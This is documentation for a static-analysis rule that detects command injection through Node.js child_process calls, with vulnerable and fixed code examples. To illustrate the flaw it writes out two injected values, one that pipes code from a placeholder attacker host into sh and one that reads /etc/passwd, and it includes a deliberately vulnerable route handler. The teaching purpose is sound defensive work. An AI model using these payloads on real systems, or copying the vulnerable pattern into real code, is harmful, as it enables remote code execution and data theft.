# `flow/command-injection-via-exec`

> Catches untrusted request input flowing into a Node.js
> `child_process` exec / execFile / spawn call where the
> attacker controls the command, binary path, or shell-interpreted
> argument string.

## Metadata

| Field | Value |
|---|---|
| Rule ID | `flow/command-injection-via-exec` |
| Status | experimental |
| Severity | critical |
| Frameworks | generic Node, nextjs >= 13 self-hosted (single-file + cross-file slice 2) |
| Default | enabled |
| Added in | v0.2 (Phase 2 of [ADR 0011](../decisions/0011-v01-to-v02-transition.md), Track B) |

## What this rule catches

OS command injection is the most severe class of injection
vulnerability — the attacker submits a value the application
splices into a string passed to the operating-system shell, which
parses metacharacters (`;`, `&&`, `|`, backticks, `$()`, …) and
executes whatever the attacker requests. The result is arbitrary
code execution under the application's process identity:
filesystem access, network access, secret-store access, lateral
movement to other services.

Stryx flags request-body data flowing into the canonical Node.js
command-execution APIs from `node:child_process`:

- **`exec(<cmd>, ...)` / `execSync(<cmd>, ...)`** — shell-interpreted.
  The string is handed to `/bin/sh -c` (or `cmd.exe /c` on
  Windows), so any metacharacter in the body is an injection
  vector. Body taint anywhere in the first argument is critical.
- **`execFile(<file>, ...)` / `execFileSync(<file>, ...)` /
  `spawn(<cmd>, ...)` / `spawnSync(<cmd>, ...)`** — the first
  argument is the binary path. Without `{ shell: true }` these
  do not invoke a shell, but body-controlled binary paths still
  let the attacker execute arbitrary on-disk binaries (`/usr/bin/wget`,
  `/usr/bin/cat`, etc.) with whatever arguments the rest of the
  call supplies.

The recogniser matches:

- Bare identifier callees `exec` / `execSync` / `execFile` /
  `execFileSync` / `spawn` / `spawnSync` (after a destructured
  `import { exec } from "child_process"`).
- Member calls `<x>.<method>` where `<x>` is one of the
  conventional namespace identifiers (`cp`, `childProcess`,
  `child_process`) — covers `import * as cp from "child_process"`
  and the default-style `import child_process from "child_process"`.

## Why this happens

Shell execution often enters backend code through legitimate product
features: converting uploaded media, running Git commands, invoking
linters, or calling system tools. The unsafe shortcut is shell-string
interpolation: it is compact, easy to test, and catastrophically wrong
when any fragment is request-controlled.

The pattern:

```ts
const { filename } = await req.json();
exec(`convert ${filename} -resize 800x ${filename}.thumb.jpg`);
```

`filename` can be `image.png; curl evil.example/x | sh; #` and the
shell parses the trailing payload as a separate command.

## Bad example

```ts
// Repro: request input is spliced into a shell-interpreted command.

import type { NextRequest } from "next/server";
import { exec } from "node:child_process";
import { promisify } from "node:util";

const execAsync = promisify(exec);

export async function POST(req: NextRequest) {
  const { ref } = await req.json();
  const { stdout } = await execAsync(`git log --pretty=oneline ${ref}`);
  return new Response(stdout);
}
```

`ref` can be `HEAD; cat /etc/passwd; #` and the response leaks
the password file (and worse).

## Good example

```ts
import type { NextRequest } from "next/server";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { z } from "zod";

const execFileAsync = promisify(execFile);

// Refs are validated against a strict shape — no shell
// metacharacters can survive this regex.
const Input = z.object({
  ref: z.string().regex(/^[a-zA-Z0-9._/-]+$/).max(64),
});

export async function POST(req: NextRequest) {
  const parsed = Input.safeParse(await req.json());
  if (!parsed.success) {
    return Response.json({ error: "bad ref" }, { status: 400 });
  }
  // `execFile` does NOT invoke a shell — arguments are passed as
  // an array. Even without the regex above, a metacharacter in
  // `ref` would be passed verbatim to git, not interpreted.
  const { stdout } = await execFileAsync("git", [
    "log",
    "--pretty=oneline",
    parsed.data.ref,
  ]);
  return new Response(stdout);
}
```

Both defences land together: `execFile` with the binary path
hardcoded as a string literal *and* the ref allow-listed by
shape.

## How to fix

Avoid shell-interpreted command strings for request-controlled work. Use
`execFile` or `spawn` with a hardcoded binary path and pass user input as
separate arguments after validation. If the task can be done in process
with a library API, prefer that over launching a command.

If a shell is genuinely required, treat it as a high-risk boundary:
strictly allow-list the command, reject metacharacters, and avoid
interpolating request input into the shell string. Most web handlers
should not need this shape.

## What Stryx recognizes

Recognized as safe:

- `execFile("binary", [validatedArg])` with a literal binary path.
- `spawn("binary", [validatedArg])` with no `{ shell: true }` and a
  literal binary path.
- User input passed as array arguments to a literal binary path, because
  no shell parses metacharacters in those arguments.

Not recognized as safe:

- `exec(\`...\${body.value}...\`)`.
- A request-controlled first argument to `execFile`, `spawn`, or
  `spawnSync`.
- `{ shell: true }` with request-controlled arguments.
- Escaping with ad hoc regex replacements instead of constraining the
  value shape.
- Request validation alone when the value is still spliced into an
  `exec(...)` shell string.

## Taint signature

| Field | Value |
|---|---|
| Source labels | `UserInput` (body / query / headers / `searchParams`) |
| Sink ids | `proc.exec` / `proc.execSync` / `proc.execFile` / `proc.execFileSync` / `proc.spawn` / `proc.spawnSync`. Bare-name and `cp.X` / `childProcess.X` / `child_process.X` member shapes. |
| Sanitizers recognized | None for slice 1. The canonical safe path is `execFile(<literal binary>, [args])` with a fixed binary path — recognised by *absence* (a literal-string first argument carries no taint). |
| Scope | `SingleFile` + `CrossFile` |

## Detection logic

1. Walk every call expression. The sink-recogniser activates on
   one of the recognised shapes:
   - `exec(<cmd>)` / `execSync(<cmd>)` / `execFile(<file>)` /
     `execFileSync(<file>)` / `spawn(<cmd>)` / `spawnSync(<cmd>)`
     — bare identifier callees.
   - `<x>.<method>(<arg>)` where `<x>` is one of `cp` /
     `childProcess` / `child_process` and `<method>` is one of
     the six recognised method names.
2. The first argument is the command / binary-path. The rule
   runs the standard body-taint walk on it.
3. If the argument is body-tainted, emit a Critical Finding at
   the call span.
4. **Cross-file (slice 2).** The extract pass simulates each
   exported function with one parameter pre-tainted and records
   `ParamFlow::reaches_exec_sink_unsanitized` when the simulation
   observes a `child_process` sink. The run pass walks call sites;
   when a tainted argument flows into a reach-flagged parameter
   slot of a callee resolved via the project index, a Critical
   finding is emitted at the call site. Helpers that switch
   internally to `execFile(<literal-binary>, [<args>])` (hardcoded
   binary path, user input only in the argv array) drop the reach
   flag and suppress the call-site finding.

## Known false positive zones

- **A custom utility function named `exec`** that happens to
  match the bare-identifier shape and consumes body-tainted
  data. Slice 1's recogniser is name-shape only; the rule fires
  on this and the user must suppress it.
  → `// stryx-disable-next-line flow/command-injection-via-exec -- not child_process`.
- **`promisify(exec)`-wrapped variants** assigned to a local
  binding — `const execAsync = promisify(exec); execAsync(cmd)`.
  Slice 1 doesn't follow the promisify wrap; the call site
  (`execAsync(cmd)`) doesn't match `exec` by name. The
  promisified call is NOT flagged. Recognising this pattern is
  a slice-2 candidate.
- **Hardcoded commands with no body data** — slice 1's body-taint
  walk produces no finding when the argument is a constant or
  contains only constants. The good example above is silent.

## LLM escalation prompt (Layer 3)

Not applicable for slice 1 — fully deterministic AST analysis.
Future slices may emit UncertainZones for `promisify(exec)`
wrappers and other indirection patterns where the static
recogniser can't tell whether the call resolves to a
`child_process` API.

## Performance characteristics

- AST analysis: ~0.3ms per file (single-file slice 1; same shape
  as `flow/path-traversal` and `flow/sql-injection`).
- Cross-file slice 2 adds one per-export per-param simulation
  during the extract pass; reach-only contribution, no shape
  walks.

## Configuration

```toml
[rules."flow/command-injection-via-exec"]
severity = "critical"
```

## Suppressing this rule

Inline:
```ts
// stryx-disable-next-line flow/command-injection-via-exec -- reason
```

File-level:
```ts
// stryx-disable flow/command-injection-via-exec
```

Project-level (`stryx.toml`):
```toml
[rules]
disabled = ["flow/command-injection-via-exec"]
```

## See also

- OWASP A03:2021 — Injection
- CWE-78 — Improper Neutralization of Special Elements used in
  an OS Command
- Node.js `child_process` docs — security warnings on `exec`
- "Shellshock" CVE-2014-6271 as a reminder that the shell is a
  parser.

## History

| Version | Change |
|---|---|
| v0.2 | Initial single-file slice — body source → `child_process` `exec` / `execSync` / `execFile` / `execFileSync` / `spawn` / `spawnSync` sinks. Bare-ident and conventional-receiver member-call shapes. Severity Critical. No sanitiser recognition. |
| v0.2.1 | Slice 2 — cross-file taint via `ExportedFunctionSummary::reaches_exec_sink_unsanitized`. Route handler → imported helper → `child_process` call chains now fire at the call site with Critical severity. Helper that switches to the safer `execFile(<literal-binary>, [<args>])` shape (hardcoded binary, argv array) suppresses the call-site finding. |
